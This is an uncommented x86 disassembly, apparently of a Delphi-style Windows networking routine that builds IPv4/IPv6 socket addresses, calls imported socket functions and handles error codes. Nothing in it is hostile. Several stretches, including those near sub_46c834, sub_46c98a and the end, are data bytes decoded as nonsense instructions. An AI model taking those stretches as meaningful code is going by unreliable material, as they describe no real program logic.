push eax
movzx eax [ ebp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov ecx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc0 ]
mov edx eax
mov eax ebx
call sub_46bf40
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46bff4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46c07f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x2736
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc4 ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f7ac
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c086
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc4 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f7ac
call sub_4047d8
sub_46c090
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_46c48c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x18 ]
mov eax [ r-xdata ]
pop edx
call sub_4624e8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c493
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
jmp [ eax * 4 + jump_table_46c0d0 ]
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_406fd4
sub_46c49c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46c4e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4ed
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_46c4f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46eddc
mov [ rw-data ] esi
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_46c52c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0xc ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_46c560
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ esi ]
call sub_406248
push eax
push 0x0
xor eax eax
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea ecx [ edx + eax ]
mov edx edi
mov eax ebx
mov esi [ eax ]
call [ esi + 0x9c ]
mov edx eax
mov eax ebx
call sub_46bf40
pop edi
pop esi
pop ebx
retn
sub_46c5a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
cmp eax 0xffffffff
jne r-xdata
push eax
push 0x0
test esi esi
je r-xdata
mov eax esi
call sub_406248
sub eax edi
jno r-xdata
call sub_403e2c
cmp edi [ esi - 0x4 ]
jb r-xdata
call sub_403e34
lea ecx [ esi + edi ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa0 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46c5f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ esi ]
call sub_406248
push eax
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
xor eax eax
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea ecx [ edx + eax ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xb8 ]
mov edx eax
mov eax ebx
call sub_46bf40
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_46c650
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax ebx
call sub_406248
push eax
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx ebx
mov edx edi
mov eax esi
mov esi [ eax ]
call [ esi + 0xbc ]
mov eax ebx
call sub_406248
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46c690
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
test cl cl
jne r-xdata
push edi
push 0xd
push ecx
mov ecx esi
call sub_46c794
push edi
push 0xd
push 0x0
mov ecx esi
call sub_46c794
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_46c6c0
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
test cl cl
jne r-xdata
push edi
push 0xc
push ecx
mov ecx esi
call sub_46c794
push edi
push 0xc
push ecx
mov ecx esi
call sub_46c794
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_46c6f0
push ebp
mov ebp esp
push ecx
push ebx
movzx eax cl
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push 0x4
mov ecx 0x29
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xac ]
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push 0x4
xor ecx ecx
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xac ]
jmp r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46c73c
push ebp
mov ebp esp
push ecx
push ebx
test cl cl
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push 0xb
lea eax [ ebp - 0x4 ]
push eax
push 0x4
mov ecx 0x29
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xac ]
push 0xb
lea eax [ ebp - 0x4 ]
push eax
push 0x4
xor ecx ecx
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xac ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46c794
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46f934
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_46f9d4
test al al
je r-xdata
push 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ rw-data ]
call sub_46bdb8
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x8
xor ecx ecx
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xac ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push 0x1
lea ecx [ ebp - 0x1c ]
mov edx esi
mov eax [ rw-data ]
call sub_46bdb8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x14
mov ecx 0x29
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xac ]
sub_46c834
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x46
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al [ ebp + 0x49 ]
dec ecx
push eax
jbe r-xdata
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x280046ed ] cl
fiadd [ esi ]
cmp ch ch
inc esi
add [ eax - 0x28 ] bh
inc esi
add [ edi + ebx * 8 ] bl
push ebp
outsb
popad
jbe r-xdata
add ah bh
inc eax
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
inc esi
imul ebp [ ecx + 0x62 ] 0xe090656c
enter 0x46 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 ] cl
inc esi
add [ ecx + eax ] cl
add [ eax ] al
push eax
jmp r-xdata
loopne r-xdata
lea eax [ eax ]
jo r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
fadd [ esi ]
sub ch bl
inc esi
add [ esp + edx * 2 ] dl
pushfd
aad 0x46
add [ esi + edx * 8 + 0x46 ] bl
add [ edx + edx * 8 ] dl
inc esi
add [ eax - 0x35 ] cl
inc esi
add ah bl

inc esi
add [ eax ] ah
in al 0x46
add al ch
loope r-xdata
add ah bl
fld [ esi ]
call 0x3c470fd3
fld [ esi ]
test cl bl
inc esi
add [ ebp + ebx * 8 - 0x239fffba ] ah
inc esi
add [ eax ] ch
fld [ esi ]
adc al 0x54
add [ eax ] bl
aas
inc eax
add [ eax ] ah

inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x36 ] cl
inc esi
add [ eax ] dl
add [ eax ] al
add [ eax ] bl
mov ecx 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
mov [ esi ] 0x80
out 0x46 eax
add [ ebx + 0x46 ] bh
add al dh
mov [ esi ] 0x3c
mov [ esi ] sub_46c690
rol dh 0x46
add [ edx + edi * 8 + 0x46 ] ah
add [ ebp + 0x46 ] bl
add ah dl
int3
add [ edi + edx * 8 + 0x46 ] cl
add al ah
int3
sub_46c98a
inc esi
add [ eax ] bl
loope r-xdata
rol [ esi ] 0x1
pushad
lds eax [ esi ]
movsb [ edi ] [ esi ]
add [ eax - 0x36 ] bl
inc esi
add al ah
loop r-xdata
lds eax [ esi ]
clc
lds eax [ esi ]
push eax
add [ eax ] ah
in al 0x46
add al ch
loope r-xdata
mov [ esi ] 0x80
out 0x46 eax
add [ ebx + 0x46 ] bh
add al dh
mov [ esi ] 0x3c
mov [ esi ] sub_46c690
rol dh 0x46
add [ edx + edi * 8 + 0x46 ] ah
add [ ebp + 0x46 ] bl
add ah dl
int3
add [ edi + edx * 8 + 0x46 ] cl
add al ah
int3
sub_46cb20
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46c52c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_46cb48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_46cbc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404e98
movzx eax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cbd0
lea eax [ ebp - 0x18 ]
call sub_404e44
retn
sub_46cbdc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x2
test esi esi
jne r-xdata
je r-xdata
push 0x0
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_46bdb8
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x2c ] 0x17
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
mov eax esi
call sub_405120
test eax eax
jne r-xdata
jmp r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
jmp r-xdata
call sub_403e2c
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
push 0x1
lea ecx [ ebp - 0x24 ]
mov edx esi
mov eax ebx
call sub_46bdb8
lea eax [ ebp - 0x24 ]
xor ecx ecx
mov edx 0x10
call sub_403728
jmp r-xdata
mov eax ebx
call sub_46c49c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x2a ] ax
push 0x1c
lea eax [ ebp - 0x2c ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
jmp r-xdata
call sub_403e2c
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
sub_46cce0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46ce7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
sub al 0x1
jb r-xdata
mov eax edi
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
push 0x2
push 0x4
lea eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_40503c
jmp r-xdata
or edx 0xffffffff
mov eax esi
call sub_46bf40
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ce84
lea eax [ ebp - 0x2c ]
call sub_404e44
retn
lea eax [ ebp - 0x28 ]
xor ecx ecx
mov edx 0x20
call sub_403728
movzx eax bl
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x28 ] 0x2
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax edi
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
xor eax eax
push ebp
push sub_46ce59
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax esi
call sub_46c49c
mov eax [ ebp + 0x8 ]
mov edx 0x401
call sub_4055ac
push 0x4
push 0x0
push 0x0
push 0x401
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_405324
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_40503c
mov eax ebx
call sub_46b6e4
mov edx eax
mov eax esi
call sub_46bff4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ce90
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4055ac
mov eax [ ebx ]
call sub_405120
push eax
mov eax [ ebx ]
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_405324
mov edx eax
mov eax ebx
call sub_40503c
pop ebx
retn
sub_46cecc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
pop edi
pop esi
pop ebx
retn
sub_46cef0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46cf0c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46d00d
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea eax [ ebp - 0x34 ]
push eax
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x34 ]
mov eax [ ebp + 0x10 ]
call sub_404e98
movzx eax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d014
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_404e68
retn
mov [ ebp - 0x4 ] 0x1c
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebp - 0x28 ]
mov cl 0x1
mov eax ebx
call sub_46bc54
mov edx [ ebp - 0x38 ]
mov eax [ ebp + 0x10 ]
call sub_404e98
movzx eax [ ebp - 0x2e ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
jmp r-xdata
xor esi esi
mov eax ebx
call sub_46c49c
sub_46d020
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46d050
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x18 ]
xor eax eax
push ebp
push sub_46d1cf
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
lea eax [ ebp - 0x14 ]
xor ecx ecx
mov edx 0x10
call sub_403728
mov [ ebp - 0x14 ] 0x2
push 0x0
lea ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
call sub_46bdb8
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
call sub_403e2c
lea eax [ ebp - 0x30 ]
xor ecx ecx
mov edx 0x1c
call sub_403728
mov [ ebp - 0x30 ] 0x17
push 0x1
lea ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
call sub_46bdb8
mov eax [ ebp + 0xc ]
cmp eax 0xffff
jbe r-xdata
jmp r-xdata
cmp esi 0xffffffff
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x2e ] ax
push 0x1c
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
call sub_403e2c
xor esi esi
mov eax ebx
call sub_46c49c
cmp edi esi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax 0x2738
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d1d6
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_404e68
retn
lea edx [ ebp - 0x38 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x38 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax ebx
call sub_46bf28
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
sub_46d1e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_46bf40
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46d214
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0xc ] eax
sub_46d244
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x1
push 0x0
push 0x0
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
pop ebp
retn 0x8
sub_46d274
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46d352
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_404570#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462614
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
movsx eax [ ebx + 0x8 ]
cmp eax 0xffff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d359
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
call sub_403e2c
sub_46d2fa
add [ eax ] eax
add [ eax ] al
sbb al 0x89
inc eax
add [ esi ] al
rol [ esi ] cl
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
